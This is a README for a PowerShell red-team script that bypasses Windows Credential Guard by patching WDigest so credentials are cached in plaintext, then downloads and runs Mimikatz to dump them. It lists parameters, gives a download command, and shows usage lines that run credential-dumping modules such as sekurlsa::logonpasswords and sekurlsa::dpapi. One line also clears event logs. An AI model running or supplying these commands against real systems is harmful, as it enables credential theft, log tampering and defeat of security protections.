## Invoke-WDigest.ps1

|Script Name|Description|Privileges|Notes|
|---|---|---|---|
|[Invoke-WDigest](https://github.com/r00t-3xp10it/redpill/blob/main/lib/DeviceGuard/Invoke-WDigest.ps1)|Credential Guard Bypass Via Patching Wdigest Memory|Administrator|Credits: @wh0nsq, @BenjaminDelpy|

<br />

|Parameter|Description|Defaul value|
|---|---|---|
|WDigest|Activate WDigest credential caching in Memory?|<b><i>true</i></b>|
|ManyCats|Switch that downloads\executes Mimikatz to dump credentials|<b><i>false</i></b>|
|RunAs|Switch that promps user for credential input and store it in memory|<b><i>false</i></b>|
|DcName|Switch of RunAs command that accepts USER@DOMAIN or DOMAIN\USER<br />Remark: this function requires <b><i>-RunAs</i></b> parameter switch declaration|<b><i>$Env:COMPUTERNAME\\$Env:USERNAME</i></b>|
|Module|Mimikatz selection of dump::modules to run|<b><i>sekurlsa::wdigest exit</i></b>|

<br />

**download script:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1" -OutFile "Invoke-WDigest.ps1"
```

<br />

**run cmdlet:**
```powershell
# Cmdlet help
Get-Help .\Invoke-WDigest.ps1 -full

# Execute Mimikatz (interactive shell) without WDigest caching
.\Invoke-WDigest.ps1 -wdigest 'false' -manycats

#  Ativate WDigest caching + Execute Mimikatz sekurlsa::wdigest exit
.\Invoke-WDigest.ps1 -wdigest 'true' -manycats

# Ativate WDigest caching + Exec M[i]mika[t]z 'net::group sekurlsa::wdigest sekurlsa::logonpasswords' multiple dump::modules
.\Invoke-WDigest.ps1 -wdigest 'true' -manycats -module 'sekurlsa::wdigest sekurlsa::logonpasswords sekurlsa::dpapi event::clear exit'


[FAST DEMONSTRATION]

## Ativate WDigest caching + dump created credential
.\Invoke-WDigest.ps1 -WDigest 'true' -manycats -runas

WORKFLOW
   - Invoke-WDigest.ps1 Ativates WDigest caching in memory
   - Invoke-WDigest.ps1 prompts user to enter credential to start cmd.exe
   - WDigest will store credential input by user in clear-text in memory
   - mimikatz will auto-execute 'sekurlsa::wdigest exit' to dump credentials

REMARK
   RunAs parameter switch exists for demonstration effects, and can not be
   used remotely because it requires target user interaction (prompt cred)
   and resource UserName password knowledge ..
```

<br />

![poc](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.png)

<br />

![poc](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest2.png)
